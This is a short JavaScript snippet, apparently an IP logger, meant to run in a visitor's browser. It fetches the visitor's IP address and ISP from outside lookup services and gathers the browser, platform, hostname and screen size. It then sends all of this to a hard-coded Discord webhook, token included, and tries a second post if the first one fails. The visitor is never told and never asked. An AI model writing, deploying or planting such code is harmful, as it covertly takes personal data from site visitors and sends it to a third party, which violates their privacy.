let ip = "";
let browser = window.navigator.userAgent;
let os = window.navigator.platform;
let userAgent = navigator.userAgent;
let hostName = window.location.hostname;
let isp = "";
let screenWidth = window.innerWidth;
let screenHeight = window.innerHeight;


fetch("https://api.ipify.org")
  .then(response => response.text()) 
  .then(data => { 
    ip = data;
    return fetch(`https://ipapi.co/${ip}/json/`); 
  })
  .then(response => response.json()) 
  .then(data => { 
    isp = data.org;
    
    const body = { content: `Date/Time: ${Date.now()}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}\nScreen Size: ${screenWidth} x ${screenHeight}` };
    fetch("https://discord.com/api/webhooks/1186695271191683113/1rSP60HLhbv0ohcwn7ss7dE_5bmsWlZFpnGWDVOHrv1rI02pzFowKCVaSRV3jgMjH77s", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
      .then(() => console.log("success")) 
      .catch(() => { 
        const body = { content: `Date/Time: ${Date.now()}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
        fetch("https://discord.com/api/webhooks/1186695271191683113/1rSP60HLhbv0ohcwn7ss7dE_5bmsWlZFpnGWDVOHrv1rI02pzFowKCVaSRV3jgMjH77s", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
          .then(() => console.log("Success! (fallback)")) 
      }); 
  });
```
